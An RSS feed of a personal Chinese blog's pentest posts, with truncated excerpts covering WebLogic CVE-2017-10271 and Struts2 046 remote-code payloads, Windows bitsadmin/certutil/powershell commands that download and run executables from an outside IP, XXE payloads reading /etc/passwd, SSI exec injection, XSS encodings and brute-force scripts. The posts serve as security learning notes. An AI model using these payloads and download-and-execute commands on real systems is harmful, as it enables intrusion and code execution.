<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Pentest on Reber&#39;s Blog</title>
    <link>http://wyb0.com/topics/pentest/</link>
    <description>Recent content in Pentest on Reber&#39;s Blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>Copyright &amp;copy; 2016-2018 Reber. All Rights Reserved.</copyright>
    <lastBuildDate>Mon, 16 Apr 2018 19:16:14 +0800</lastBuildDate>
    
	<atom:link href="http://wyb0.com/topics/pentest/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>ThinkPHP5的where函数</title>
      <link>http://wyb0.com/posts/thinkphp5-where-function/</link>
      <pubDate>Mon, 16 Apr 2018 19:16:14 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/thinkphp5-where-function/</guid>
      <description>0x00 关于thinkphp5的where函数 年前公司委托别的公司开发一个网站，使用的是ThinkPHP5.0，存在一个注入漏洞，分析后发现是因为tp5中的where函数使用不当，tp5中where这个函数可以接收字符串和数组这两种类型的参数来进行查询，而在用字符串这种传递方式时，如果使用不当的话就可能会出现sql注入。
0x01 示例代码 tp5/application/home/controller/Index.php
&amp;lt;?php namespace app\home\controller; use think\Db; class Index { public function testDb() { $msg = db(&#39;msg&#39;); $id = input(&#39;param.id&#39;,1); //不存在id的话默认为1 $where = &amp;quot;id=&amp;quot;.$id; $result = $msg-&amp;gt;where($where)-&amp;gt;select(); // $result = $msg-&amp;gt;where([&#39;id&#39;=&amp;gt;$id])-&amp;gt;select(); echo $msg-&amp;gt;getLastSql(); echo &#39;&amp;lt;br/&amp;gt;&amp;lt;br/&amp;gt;&#39;; echo var_dump($result); } }  访问http://127.0.0.1/Source/tp5/home/index/testdb/id/1时返回的语句分别如下：
SELECT * FROM `msg` WHERE ( id=1 ) SELECT * FROM `msg` WHERE `id` = 1  前者存在注入，如下： 主要调用文件及函数顺序如下：
tp5/thinkphp/library/think/db/Query.php __construct() tp5/thinkphp/library/db/Builder.php __construct() tp5/thinkphp/library/think/db/Query.php where() tp5/thinkphp/library/think/db/Query.</description>
    </item>
    
    <item>
      <title>WebLogic WLS组件反序列化漏洞</title>
      <link>http://wyb0.com/posts/cve-2017-10271/</link>
      <pubDate>Fri, 09 Mar 2018 09:20:03 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/cve-2017-10271/</guid>
      <description>0x00 WebLogic WLS组件反序列化漏洞 这个漏洞的编号是CVE-2017-10271，是利用Oracle WebLogic中WLS 组件的反序列化漏洞进行远程代码执行的，刚出来时没有看，现在记录一下
漏洞环境：https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2017-10271
0x01 访问远程文件 POST /wls-wsat/CoordinatorPortType HTTP/1.1 Host: 127.0.0.1:7001 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Cookie: JSESSIONID=DJbghZRGlJf0PyyLc52n4GdvrbDkrxKWGDpwnncFpHnqsDjMT68F!-298356074 Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Content-Length: 688 Content-Type: text/xml &amp;lt;soapenv:Envelope xmlns:soapenv=&amp;quot;http://schemas.xmlsoap.org/soap/envelope/&amp;quot;&amp;gt; &amp;lt;soapenv:Header&amp;gt; &amp;lt;work:WorkContext xmlns:work=&amp;quot;http://bea.com/2004/06/soap/workarea/&amp;quot;&amp;gt; &amp;lt;java version=&amp;quot;1.8&amp;quot; class=&amp;quot;java.beans.XMLDecoder&amp;quot;&amp;gt; &amp;lt;object id=&amp;quot;url&amp;quot; class=&amp;quot;java.net.URL&amp;quot;&amp;gt; &amp;lt;string&amp;gt;http://114.115.123.123:80/aaaaaaa&amp;lt;/string&amp;gt; &amp;lt;/object&amp;gt; &amp;lt;object idref=&amp;quot;url&amp;quot;&amp;gt; &amp;lt;void id=&amp;quot;stream&amp;quot; method = &amp;quot;openStream&amp;quot; /&amp;gt; &amp;lt;/object&amp;gt; &amp;lt;/java&amp;gt; &amp;lt;/work:WorkContext&amp;gt; &amp;lt;/soapenv:Header&amp;gt; &amp;lt;soapenv:Body/&amp;gt; &amp;lt;/soapenv:Envelope&amp;gt;  0x02 写入文件 POST /wls-wsat/CoordinatorPortType HTTP/1.</description>
    </item>
    
    <item>
      <title>Metasploit简单提权</title>
      <link>http://wyb0.com/posts/msf-simple-elevate-privileges/</link>
      <pubDate>Mon, 26 Feb 2018 13:43:20 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/msf-simple-elevate-privileges/</guid>
      <description>0x00 前提 获得了一个shell：http://10.11.11.20/a.php
外网安装msf的主机：114.115.123.123
0x01 查看主机基本信息 菜刀连接shell，终端执行systeminfo
C:\Apps\phpStudy\WWW\&amp;gt; systeminfo 主机名: REBER-WIN7 OS 名称: Microsoft Windows 7 专业版 OS 版本: 6.1.7600 ��ȱ Build 7600 OS 制造商: Microsoft Corporation OS 配置: 独立服务器 OS 构件类型: Multiprocessor Free 注册的所有人: reber 注册的组织: 产品 ID: 00371-868-0000007-85272 初始安装日期: 2017/12/26, 7:23:00 系统启动时间: 2018/2/26, 9:52:14 系统制造商: Parallels Software International Inc. 系统型号: Parallels Virtual Platform 系统类型: x64-based PC 处理器: 安装了 1 个处理器。 [01]: Intel64 Family 6 Model 70 Stepping 1 GenuineIntel ~2495 Mhz BIOS 版本: Parallels Software International Inc.</description>
    </item>
    
    <item>
      <title>Windows终端下载文件和执行远程文件</title>
      <link>http://wyb0.com/posts/win-terminal-download-and-exec-remote-file/</link>
      <pubDate>Tue, 06 Feb 2018 15:12:32 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/win-terminal-download-and-exec-remote-file/</guid>
      <description>环境：Windows Server 2008 R2 Enterprise
0x00 bitsadmin下载文件 bitsadmin /rawreturn /transfer getfile http://114.115.123.123/a.exe C:\Windows\Temp\a.exe bitsadmin /rawreturn /transfer getpayload http://114.115.123.123/a.zip C:\Windows\Temp\a.zip bitsadmin /transfer myDownLoadJob /download /priority normal http://114.115.123.123/a.exe C:\Windows\Temp\a.exe  0x01 certutil下载文件 保存在当前目录
certutil -urlcache -split -f http://114.115.123.123/a.exe a.exe  有时会下载二进制文件的base64编码后的字符串，然后再解码
本地：certutil -encode cc.exe base64.txt 目标：certutil -urlcache -split -f http://114.115.123.123/base64.txt 目标：certutil -decode base64.txt cc.exe  文件会以二进制形式缓存到目录：C:\Users\Administrator\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content
certutil -urlcache -f http://114.115.123.123/a.exe  0x02 powershell下载文件 powershell (new-object System.Net.WebClient).DownloadFile(&amp;quot;http://114.115.123.123/a.exe&amp;quot;,&amp;quot;C:\Windows\Temp\a.exe&amp;quot;) #-w hidden 下载后终端自动退出 powershell -w hidden -c (new-object System.</description>
    </item>
    
    <item>
      <title>XXE漏洞</title>
      <link>http://wyb0.com/posts/xxe/</link>
      <pubDate>Sat, 09 Dec 2017 23:02:22 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/xxe/</guid>
      <description>0x00 XXE XXE漏洞是针对使用XML交互的Web应用程序的攻击方法
XML文件作为配置文件(spring、Struts2等)、文档结构说明文件(PDF、RSS等)、图片格式文件(SVG header)应用比较广泛
0x01 XML格式 &amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt; &amp;lt;!--xml声明--&amp;gt; &amp;lt;!--文档类型定义--&amp;gt; &amp;lt;!DOCTYPE note [ &amp;lt;!ELEMENT note (to,from,heading,body)&amp;gt; &amp;lt;!ELEMENT to (#PCDATA)&amp;gt; &amp;lt;!ELEMENT from (#PCDATA)&amp;gt; &amp;lt;!ELEMENT heading (#PCDATA)&amp;gt; &amp;lt;!ELEMENT body (#PCDATA)&amp;gt; ]&amp;gt; &amp;lt;!--文档元素--&amp;gt; &amp;lt;note&amp;gt; &amp;lt;to&amp;gt;Tom&amp;lt;/to&amp;gt; &amp;lt;from&amp;gt;John&amp;lt;/from&amp;gt; &amp;lt;heading&amp;gt;Reminder&amp;lt;/heading&amp;gt; &amp;lt;body&amp;gt;Hi,I’am John&amp;lt;/body&amp;gt; &amp;lt;/note&amp;gt;  0x02 内部声明与外部引用 &amp;lt;!--内部声明实体--&amp;gt; &amp;lt;!ENTITY 实体名称 &amp;quot;实体的值&amp;quot;&amp;gt; &amp;lt;!--引用外部实体--&amp;gt; &amp;lt;!ENTITY 实体名称 SYSTEM &amp;quot;URI&amp;quot;&amp;gt;  0x03 XXE漏洞  外部引用时可能会出现漏洞，几种payload：  &amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt; &amp;lt;!DOCTYPE a [ &amp;lt;!ENTITY xxe SYSTEM &amp;quot;file:///etc/passwd&amp;quot; &amp;gt; ]&amp;gt; &amp;lt;test&amp;gt;&amp;amp;xxe;&amp;lt;/test&amp;gt;  &amp;lt;?</description>
    </item>
    
    <item>
      <title>SSI注入</title>
      <link>http://wyb0.com/posts/ssi-injection/</link>
      <pubDate>Thu, 08 Jun 2017 11:20:15 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/ssi-injection/</guid>
      <description> 0x00 SSI SSI (Server Side Includes)是HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。
在很多场景中，用户输入的内容可以显示在页面中，一个存在反射XSS漏洞的页面，如果输入的payload不是xss代码而是ssi的标签，服务器又开启了ssi支持的话就会存在SSI漏洞
若注入点在url中则可能需要进行url编码
0x01 payload &amp;quot;--&amp;gt;&#39;--&amp;gt;`--&amp;gt;&amp;lt;!--#set var=&amp;quot;a&amp;quot; value=&amp;quot;123&amp;quot;--&amp;gt;&amp;lt;!--#set var=&amp;quot;b&amp;quot; value=&amp;quot;654&amp;quot;--&amp;gt;&amp;lt;!--#echo var=&amp;quot;a&amp;quot;--&amp;gt;&amp;lt;!--#echo var=&amp;quot;b&amp;quot;--&amp;gt; &amp;lt;!--#echo var=&amp;quot;DATE_LOCAL&amp;quot; --&amp;gt; &amp;lt;!--#exec cmd=&amp;quot;dir&amp;quot; --&amp;gt;  0x02 示例  Referer被输出到了页面中   url中的数据被输出到页面中(有时候url中的payload需要url编码)  </description>
    </item>
    
    <item>
      <title>Struts2 046</title>
      <link>http://wyb0.com/posts/struts2-046/</link>
      <pubDate>Sun, 16 Apr 2017 17:44:01 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/struts2-046/</guid>
      <description>Struts2 046 前段时间写的struts2 046检测脚本，代码如下：
#!/usr/bin/env python # -*- coding: utf-8 -*- # code by reber import sys import pycurl import StringIO def initCurl(): c = pycurl.Curl() c.setopt(pycurl.FOLLOWLOCATION, 1) #允许跟踪来源 c.setopt(pycurl.MAXREDIRS, 5) # c.setopt(pycurl.PROXY,&#39;http://127.0.0.1:1080&#39;) return c def check(curl, url): head = [ &#39;Connection: close&#39;, &#39;Content-Type: multipart/form-data; boundary=---------------------------735323031399963166993862150&#39; ] data = &#39;&#39;&#39;-----------------------------735323031399963166993862150\r\nContent-Disposition: form-data; name=&amp;quot;foo&amp;quot;; filename=&amp;quot;%{(#nike=&#39;multipart/form-data&#39;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#39;echo dd996b71024fa97cd015f06a7f24ed30&#39;).(#iswin=(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds=(#iswin?{&#39;cmd.exe&#39;,&#39;/c&#39;,#cmd}:{&#39;/bin/bash&#39;,&#39;-c&#39;,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\0b&amp;quot;\r\nContent-Type: text/plain\r\n\r\nx\r\n-----------------------------735323031399963166993862150--\r\n\r\n&#39;&#39;&#39; buf = StringIO.StringIO() curl.setopt(pycurl.WRITEFUNCTION, buf.write) curl.setopt(pycurl.POSTFIELDS, data) curl.setopt(pycurl.URL, url) # curl.setopt(pycurl.TIMEOUT, 10) curl.setopt(pycurl.HTTPHEADER, head) curl.</description>
    </item>
    
    <item>
      <title>检测WebLogic是否存在SSRF</title>
      <link>http://wyb0.com/posts/weblogic-ssrf-check/</link>
      <pubDate>Fri, 14 Apr 2017 14:43:52 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/weblogic-ssrf-check/</guid>
      <description>检测脚本如下 #!/usr/bin/env python # -*- coding: utf-8 -*- import re import sys import Queue import requests import threading from requests.packages.urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disable_warnings(InsecureRequestWarning) queue = Queue.Queue() mutex = threading.Lock() class Weblogic_SSRF_Check(threading.Thread): &amp;quot;&amp;quot;&amp;quot;docstring for Weblogic_SSRF_Check&amp;quot;&amp;quot;&amp;quot; def __init__(self, queue): threading.Thread.__init__(self) self.queue = queue def check(self,domain,ip): payload = &amp;quot;uddiexplorer/SearchPublicRegistries.jsp?operator={ip}&amp;amp;rdoSearch=name&amp;amp;txtSearchname=sdf&amp;amp;txtSearchkey=&amp;amp;txtSearchfor=&amp;amp;selfor=Business+location&amp;amp;btnSubmit=Search&amp;quot;.format(ip=ip) url = domain + payload try: html = requests.get(url=url, timeout=15, verify=False).content m = re.search(&#39;weblogic.uddi.client.structures.exception.XML_SoapException&#39;,html) if m: mutex.acquire() with open(&#39;ssrf.txt&#39;,&#39;a+&#39;) as f: print &amp;quot;%s has weblogic ssrf.</description>
    </item>
    
    <item>
      <title>XSS中的编码</title>
      <link>http://wyb0.com/posts/xss-encode/</link>
      <pubDate>Thu, 30 Mar 2017 15:25:37 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/xss-encode/</guid>
      <description>0x00 浏览器解析 浏览器收到服务器发来的HTML内容，会从头解析，遇到&amp;lt;script&amp;gt;&amp;lt;/script&amp;gt;时， 会调用js脚本解析器来解析并执行脚本，然后继续解析其他的HTML内容， 对于需要触发才能执行的事件，当事件触发时脚本解析器才会解析其中的脚本， 在这之前它是HTML的一部分  0x01 一些编码  URL编码
%+字符的ASCII编码对应的两位十六进制，如&amp;quot;/&amp;quot;的url编码为&amp;quot;%2F&amp;quot;  HTML编码
 实体编码
&amp;amp;开头分号结尾，如 &amp;quot;&amp;lt;&amp;quot; 的编码是 &amp;quot;&amp;amp;lt;&amp;quot;  字符编码
样式为&amp;quot;&amp;amp;#数值;&amp;quot;，数值可为10进制、16进制ASCII编码或unicode字符编码 如&amp;quot;&amp;lt;&amp;quot;可编码为&amp;quot;&amp;amp;#060;&amp;quot;和&amp;quot;&amp;amp;#x3c;&amp;quot;，但是必须在属性值里面   JS编码
1、两个十六进制数字，如果不够个数，前面补0，例如&amp;quot;&amp;lt;&amp;quot;编码为&amp;quot;\x3c&amp;quot; 2、三个八进制数字，如果不够个数，前面补0，例如&amp;quot;&amp;lt;&amp;quot;编码为&amp;quot;\074&amp;quot; 3、四个十六进制数字，如果不够个数，前面补0，例如&amp;quot;&amp;lt;&amp;quot;编码为&amp;quot;\u003c&amp;quot; 4、对于一些控制字符，使用特殊的C类型的转义风格（例如\n和\r）  CSS编码
反斜线(\)后跟1~6位的16进制数字，如&amp;quot;e&amp;quot;为&amp;quot;\65&amp;quot;或&amp;quot;65&amp;quot;或&amp;quot;00065&amp;quot;   0x02 编码与解码顺序 解码时先解码最外层，编码时先编码最内层
如&amp;lt;td onclick=&amp;quot;openUrl(add.do?userName=&#39;{$value}&#39;);&amp;quot;&amp;gt;11&amp;lt;/td&amp;gt;， 首先value出现在url中，而url在js中，而js又是html一部分，所以 解码顺序为：html解码-&amp;gt;js解码-&amp;gt;url解码 编码顺序为：url编码-&amp;gt;js编码-&amp;gt;html编码  0x03 利用  八进制
&amp;lt;p id=&amp;quot;test&amp;quot;&amp;gt;&amp;lt;/p&amp;gt; &amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt; var test = &amp;quot;\74\151\155\147\40\163\162\143\75\170\40\157\156\145\162\162\157\162\75\141\154\145\162\164\50\61\51\76&amp;quot;; var p = document.getElementById(&#39;test&#39;); #这里会进行js解码 p.innerHTML = test; &amp;lt;/script&amp;gt;  十进制和十六进制
&amp;lt;img src=x onerror=&amp;quot;\u0061\u006c\u0065\u0072\u0074(1)&amp;quot;&amp;gt; &amp;lt;img src=x onerror=&amp;quot;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#49;&amp;amp;#41;&amp;quot;&amp;gt;  javascript协议</description>
    </item>
    
    <item>
      <title>利用多参数提高webshell爆破速度</title>
      <link>http://wyb0.com/posts/multi-parameter-blasting-webshell/</link>
      <pubDate>Fri, 17 Feb 2017 10:32:24 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/multi-parameter-blasting-webshell/</guid>
      <description>0x00 原理 之前在https://www.t00ls.net/viewthread.php?tid=36985看到这个思路的。
Apache下默认同时允许接收1000个参数；IIS下默认同时允许接收5883个参数，可以一次提交多个密码，从而快速爆破。
0x01 爆破webshell代码 #!/usr/bin/env python # -*- coding: utf-8 -*- # code by reber &amp;lt;1070018473@qq.com&amp;gt; import sys import requests proxy = {&#39;http&#39;:&#39;http://127.0.0.1:8080&#39;} headers = { &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:46.0) Gecko/20100101 Firefox/46.0&#39;, &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;, &#39;Accept-Language&#39;: &#39;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#39;, &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;, &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;, } def get_file(filename): data = [] with open(filename,&#39;r&#39;) as f: lines = f.readlines() for line in lines: data.append(line.strip()) return data def get_payloads(data): payloads = [] for x in xrange(0,10): print x*1000,(x+1)*1000 payload = [] for y in data[x*1000:(x+1)*1000]: payload.</description>
    </item>
    
    <item>
      <title>Python实现CDN的判断</title>
      <link>http://wyb0.com/posts/python-cnd-check/</link>
      <pubDate>Fri, 23 Dec 2016 21:10:05 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/python-cnd-check/</guid>
      <description>0x00 什么是CDN CDN的全称是Content Delivery Network，即内容分发网络。主要功能是在不同地点缓存内容， 运营商会在全国各地的节点上缓存你的网站网页，通过负载均衡技术，将用户的请求定向到最合适的 缓存服务器上去获取内容，比如说你是上海用户，你访问www.aa.com就会被重定向到上海的节点， 你是北京用户，你也访问www.aa.com，但是你会被重定向到上海的节点。  0x01 判断方法  可以查询CNAME记录，每个cdn厂商都有特有的特征串 查看http返回头的头部信息  0x02 代码 首先安装dnspython这个第三方模块：pip install dnspython
#!/usr/bin/env python # -*- coding: utf-8 -*- import sys import dns.resolver import urllib2 import urlparse class CdnCheck(object): def __init__(self, url): super(CdnCheck, self).__init__() self.cdninfo() self.url = url self.cnames = [] self.headers = [] def get_cnames(self): # get all cname furl = urlparse.urlparse(self.url) url = furl.netloc # print url rsv = dns.</description>
    </item>
    
    <item>
      <title>脏牛漏洞</title>
      <link>http://wyb0.com/posts/dirty-cow-vulnerabilities/</link>
      <pubDate>Sat, 22 Oct 2016 00:10:46 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/dirty-cow-vulnerabilities/</guid>
      <description>0x00 测试环境 我是在本地虚拟机测试的，个人理解这个漏洞的话可以起到的作用是：一个普通用户可以覆盖一个root用户的只读文件，若理解有误则希望大家提意见
CentOS release 6.5 [reber123@WYB ~]$ uname -a Linux WYB 3.10.5-3.el6.x86_64 #1 SMP Tue Aug 20 14:10:49 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux [reber123@WYB ~]$ id uid=502(reber123) gid=502(reber123) groups=502(reber123)  0x01 创建文件 查看文件权限信息，可以看到属主为root，且只读，权限为0404
[reber123@WYB ~]$ ls -al test -r-----r-- 1 root root 19 Oct 21 00:02 test [reber123@WYB ~]$ cat test this is not a test [reber123@WYB ~]$  0x02 编译、执行poc POC保存为a.c，编译为aaa
[reber123@WYB ~]$ gcc -lpthread a.c -o aaa [reber123@WYB ~]$ ls aaa a.</description>
    </item>
    
    <item>
      <title>代码执行漏洞(二)</title>
      <link>http://wyb0.com/posts/code-execution-vulnerabilities-2/</link>
      <pubDate>Fri, 14 Oct 2016 13:16:32 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/code-execution-vulnerabilities-2/</guid>
      <description> 接着上一篇：代码执行漏洞(一) 0x00 函数create_function() php中的函数create_function()可以创建一个匿名函数，其函数原型如下：
string create_function ( string $args , string $code ) 其中$args是函数的参数，$code是函数的内容  若对提交的code未过滤或过滤不当则可能会导致代码执行漏洞
0x01 示例 示例a.php代码如下：
&amp;lt;?php $test = @$_GET[&#39;test&#39;]; $newfun = create_function(&#39;$a,$b&#39;, $test); $newfun(&#39;1111&#39;,&#39;2222&#39;); ?&amp;gt; 上述代码中$nuwfun(&#39;1111&#39;,&#39;2222&#39;)代表此时$a=&#39;1111&#39;,$b=&#39;2222&#39;,然后将其传给$test  0x02 函数assert() 这个函数和eval()的作用差不多
&amp;lt;?php @assert($_GET[&#39;str&#39;]); ?&amp;gt;  </description>
    </item>
    
    <item>
      <title>利用_blank属性钓鱼</title>
      <link>http://wyb0.com/posts/use-_blank-attribute-to-fish/</link>
      <pubDate>Wed, 12 Oct 2016 10:24:38 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/use-_blank-attribute-to-fish/</guid>
      <description>0x00 _blank _blank是html中的标签属性，如&amp;lt;a target=&amp;quot;_blank&amp;quot; href=&amp;quot;http://xss.reber-9.com/1.php&amp;quot;&amp;gt;HELLO&amp;lt;/a&amp;gt;, 但若点击HELLO打开的网页1.php中有如下代码：
&amp;lt;script&amp;gt; if(window.opener){ window.opener.location = &amp;quot;http://xss.reber-9.com/fish.html&amp;quot;; } &amp;lt;/script&amp;gt;  则原网页将转跳到http://xss.reber-9.com/fish.html ，这就会造成钓鱼
0x01 简单模板  a.html内容如下：  &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt; &amp;lt;title&amp;gt;Document&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;a target=&amp;quot;_blank&amp;quot; href=&amp;quot;http://xss.reber-9.com/1.php&amp;quot;&amp;gt;HELLO&amp;lt;/a&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt;   http://xss.reber-9.com/1.php中1.php内容如下：  &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;test&amp;lt;/title&amp;gt; &amp;lt;script&amp;gt; if(window.opener){ window.opener.location = &amp;quot;http://xss.reber-9.com/fish.html&amp;quot;; } &amp;lt;/script&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;p&amp;gt;hello&amp;lt;/p&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt;   1.php同级下有个钓鱼模板fish.html，内容如下：  &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;fish&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;h2&amp;gt;This is fishing template!&amp;lt;/h2&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt;   点击a.</description>
    </item>
    
    <item>
      <title>SqlmapApi常用方法封装</title>
      <link>http://wyb0.com/posts/package-sqlmapapi-common-function/</link>
      <pubDate>Wed, 21 Sep 2016 17:37:33 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/package-sqlmapapi-common-function/</guid>
      <description>0x00 代码如下 #!/usr/bin/env python # -*- coding: utf-8 -*- import threading import requests import json from time import sleep class Sqli(threading.Thread): &amp;quot;&amp;quot;&amp;quot;docstring for AutoSqli&amp;quot;&amp;quot;&amp;quot; def __init__(self, server, target, data=&#39;&#39;, referer=&#39;&#39;, cookie=&#39;&#39;): threading.Thread.__init__(self) self.server = server[0:-1] if server[-1]==&#39;/&#39; else server self.target = target self.data = data self.referer = referer self.cookie = cookie self.taskid = &#39;&#39; self.data def new_task(self): url = &amp;quot;{}/task/new&amp;quot;.format(self.server) self.taskid = json.loads(requests.get(url).text)[&#39;taskid&#39;] if len(self.taskid)&amp;gt;0: print &amp;quot;Create new task,taskid is: %s&amp;quot; % self.</description>
    </item>
    
    <item>
      <title>Python爆破zip压缩包</title>
      <link>http://wyb0.com/posts/python-blasting-zip-archive/</link>
      <pubDate>Tue, 20 Sep 2016 14:50:59 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/python-blasting-zip-archive/</guid>
      <description>0x00 代码 多线程爆破加密的zip压缩包
#!/usr/bin/env python # -*- coding: utf-8 -*- import sys import optparse import zipfile import threading import Queue queue = Queue.Queue() lock = threading.Lock() result = &#39;&#39; def load_pwd(filename): for line in open(filename,&#39;r&#39;): if line: queue.put(line.strip()) def bruter(zipname,queue): global result zFile = zipfile.ZipFile(zipname) while not queue.empty(): password = queue.get() try: zFile.extractall(pwd=password) # 解压 lock.acquire() print &amp;quot;[Ok] password is: %s&amp;quot; % password lock.release() result = password except: lock.acquire() print &amp;quot;[Error] password not is: %s&amp;quot; % password lock.</description>
    </item>
    
    <item>
      <title>Python爆破二级域名</title>
      <link>http://wyb0.com/posts/python-blasting-secondary-domain/</link>
      <pubDate>Mon, 12 Sep 2016 21:31:37 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/python-blasting-secondary-domain/</guid>
      <description>Reference(侵删)：https://github.com/lijiejie/subDomainsBrute
0x00 帮助信息 0x01 代码 #!/usr/bin/env python # -*- coding: utf-8 -*- import dns.resolver import threading import Queue import optparse import sys queue = Queue.Queue() lock = threading.Lock() class GetSubDomain(threading.Thread): &amp;quot;&amp;quot;&amp;quot;docstring for SubDomain&amp;quot;&amp;quot;&amp;quot; def __init__(self, target,queue,outfile): threading.Thread.__init__(self) self.target = target self.queue = queue self.rsv = dns.resolver.Resolver() outfile = target + &#39;.txt&#39; if not outfile else outfile self.f = open(&#39;./output/&#39;+outfile,&#39;a+&#39;) self.ip_list = [] def _scan(self): while not self.queue.empty(): self.ip_list = [] ips = None sub_domain = self.</description>
    </item>
    
    <item>
      <title>POC框架Pocsuite</title>
      <link>http://wyb0.com/posts/poc-framework-pocsuite/</link>
      <pubDate>Thu, 08 Sep 2016 20:38:45 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/poc-framework-pocsuite/</guid>
      <description>0x00 关于Pocsuite Pocsuite 是知道创宇安全研究团队打造的一款基于漏洞与 POC 的远程漏洞验证框架。可以让我们不用考虑过多的细节，只要考虑验证代码就可以，它封装了一些我们常用的东西，比如requests，在我们平常使用requests是要考虑cookie、要考虑header，但是在框架下则不需要有这些考虑，因为这些东西框架都帮你解决了。
0x01 简单介绍  安装  使用pip install pocsuite即可安装   常用参数  -u 指定一个目标url -f 指定一个存放目标url的文件 -r 指定一个存放poc的文件夹 &amp;ndash;report 导出结果到html文件 &amp;ndash;cookie 携带cookie &amp;ndash;referer 修改referer &amp;ndash;user-agent 修改UA  模式  执行一个poc有两种模式  --verify 漏洞验证模式(只是验证，不能更改服务器的东西) --attack 漏洞利用模式  示例  pocsuite -u &amp;quot;http://www.xxxx.com&amp;quot; -r poc_path/poc_name.py --atack   poc编写
 可以新建一个文件夹，命名为mypoc，里面就放你自己写的poc(当然也可以在mypoc里新建文件夹放一类poc，对poc进行分类) 此时示例(对目标进行常见服务的测试，加载一类多个poc脚本)  pocsuite -u &amp;quot;http://www.xxxx.com&amp;quot; -r poc_path/server/ --verify   poc的命名规范
 漏洞ID_版本号_漏洞类型(其中不能有大写字母，所有符号要改为&amp;quot;_&amp;quot;),大致如下：  _xxxx_struct2_2016_s2_016_code_execution.</description>
    </item>
    
    <item>
      <title>Python实现表单爆破</title>
      <link>http://wyb0.com/posts/python-form-blasting/</link>
      <pubDate>Mon, 05 Sep 2016 23:43:22 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/python-form-blasting/</guid>
